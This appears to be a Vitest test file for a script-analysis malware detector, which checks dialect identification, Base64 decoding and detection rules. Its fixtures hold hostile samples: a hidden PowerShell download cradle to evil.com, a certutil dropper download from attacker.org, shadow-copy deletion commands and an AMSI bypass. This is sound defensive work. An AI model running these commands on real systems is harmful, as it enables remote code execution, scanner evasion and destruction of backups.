import { describe, it, expect } from 'vitest';
import { ScriptAnalyzer } from '../../analyzers/script-analyzer';
import { DetectorLayer, SeverityLevel } from '../../types';

describe('ScriptAnalyzer (Layer 6)', () => {
  it('handles empty script input safely', () => {
    const res = ScriptAnalyzer.analyze('', 'script.ps1');
    expect(res.isScript).toBe(true);
    expect(res.scriptType).toBe('POWERSHELL');
    expect(res.isObfuscated).toBe(false);
    expect(res.evidence.length).toBe(0);
    expect(res.riskScore).toBe(0);
  });

  describe('Script Dialect Identification', () => {
    it('identifies PowerShell scripts', () => {
      expect(ScriptAnalyzer.identifyScriptType('param($x)', 'unknown')).toBe('POWERSHELL');
      expect(ScriptAnalyzer.identifyScriptType('', 'ps1')).toBe('POWERSHELL');
    });

    it('identifies Batch scripts', () => {
      expect(ScriptAnalyzer.identifyScriptType('@echo off\necho hello', 'txt')).toBe('BATCH');
      expect(ScriptAnalyzer.identifyScriptType('', 'bat')).toBe('BATCH');
    });

    it('identifies VBScript', () => {
      expect(ScriptAnalyzer.identifyScriptType('Dim x\nSet w = WScript.CreateObject("WScript.Shell")', 'txt')).toBe('VBSCRIPT');
      expect(ScriptAnalyzer.identifyScriptType('', 'vbs')).toBe('VBSCRIPT');
    });

    it('identifies JavaScript', () => {
      expect(ScriptAnalyzer.identifyScriptType('function test() { var a = 1; }', 'txt')).toBe('JAVASCRIPT');
      expect(ScriptAnalyzer.identifyScriptType('', 'js')).toBe('JAVASCRIPT');
    });

    it('identifies Shell scripts', () => {
      expect(ScriptAnalyzer.identifyScriptType('#!/bin/bash\necho 1', 'txt')).toBe('SHELL');
      expect(ScriptAnalyzer.identifyScriptType('', 'sh')).toBe('SHELL');
    });
  });

  describe('Base64 In-Memory Extraction & Decoding', () => {
    it('extracts and decodes UTF-16LE encoded PowerShell commands from -enc flag', () => {
      // "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')" encoded in UTF-16LE Base64
      const command = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')";
      const utf16Buf = Buffer.from(command, 'utf16le');
      const b64 = utf16Buf.toString('base64');

      const script = `powershell.exe -NoP -NonI -W Hidden -Enc ${b64}`;
      const res = ScriptAnalyzer.analyze(script, 'launcher.bat');

      expect(res.hasBase64Payload).toBe(true);
      expect(res.decodedPayloads.length).toBeGreaterThan(0);
      expect(res.decodedPayloads[0]).toContain('DownloadString');
      expect(res.hasDownloadCradle).toBe(true);
      expect(res.hasExecutionBypass).toBe(true);

      const rules = res.evidence.map(e => e.ruleId);
      expect(rules).toContain('script-base64-encoded-command');
      expect(rules).toContain('script-download-cradle-detected');
      expect(rules).toContain('script-execution-bypass-flags');
    });

    it('extracts Base64 from [System.Convert]::FromBase64String', () => {
      const payload = 'vssadmin delete shadows /all /quiet';
      const b64 = Buffer.from(payload, 'utf-8').toString('base64');
      const script = `$bytes = [System.Convert]::FromBase64String('${b64}'); [System.Text.Encoding]::UTF8.GetString($bytes)`;

      const res = ScriptAnalyzer.analyze(script, 'test.ps1');
      expect(res.hasBase64Payload).toBe(true);
      expect(res.hasShadowDeletion).toBe(true);
      expect(res.evidence.some(e => e.ruleId === 'script-shadow-copy-destruction')).toBe(true);
    });
  });

  describe('Critical Threat Vectors', () => {
    it('detects in-memory AMSI memory tampering evasion with critical override', () => {
      const script = `
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
          .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
      `;
      const res = ScriptAnalyzer.analyze(script, 'bypass.ps1');
      expect(res.hasMemoryEvasion).toBe(true);

      const amsiRule = res.evidence.find(e => e.ruleId === 'script-amsi-etw-memory-patching');
      expect(amsiRule).toBeDefined();
      expect(amsiRule?.severityLevel).toBe(SeverityLevel.CRITICAL);
      expect(amsiRule?.isCriticalOverride).toBe(true);
    });

    it('detects ransomware shadow copy destruction with critical override', () => {
      const script = `
        @echo off
        vssadmin delete shadows /all /quiet
        wmic shadowcopy delete
        bcdedit /set {default} recoveryenabled No
      `;
      const res = ScriptAnalyzer.analyze(script, 'cleanup.bat');
      expect(res.hasShadowDeletion).toBe(true);

      const shadowRule = res.evidence.find(e => e.ruleId === 'script-shadow-copy-destruction');
      expect(shadowRule).toBeDefined();
      expect(shadowRule?.severityLevel).toBe(SeverityLevel.CRITICAL);
      expect(shadowRule?.isCriticalOverride).toBe(true);
    });

    it('detects LOLBin abuse via certutil download cradle', () => {
      const script = 'certutil.exe -urlcache -split -f https://attacker.org/dropper.exe C:\\temp\\dropper.exe';
      const res = ScriptAnalyzer.analyze(script, 'run.bat');
      expect(res.evidence.some(e => e.ruleId === 'script-lolbin-abuse-detected')).toBe(true);
    });
  });

  describe('Obfuscation Heuristics', () => {
    it('detects excessive PowerShell backtick obfuscation', () => {
      const script = 'd`o`w`n`l`o`a`d`s`t`r`i`n`g`';
      const res = ScriptAnalyzer.analyze(script, 'test.ps1');
      expect(res.isObfuscated).toBe(true);
      expect(res.evidence.some(e => e.ruleId === 'script-obfuscated-backticks')).toBe(true);
    });

    it('detects String.fromCharCode / Chr() concatenation obfuscation', () => {
      const script = 'var cmd = String.fromCharCode(99,109,100) + String.fromCharCode(46,101,120,101);';
      const res = ScriptAnalyzer.analyze(script, 'test.js');
      expect(res.isObfuscated).toBe(true);
      expect(res.evidence.some(e => e.ruleId === 'script-charcode-obfuscation')).toBe(true);
    });
  });
});
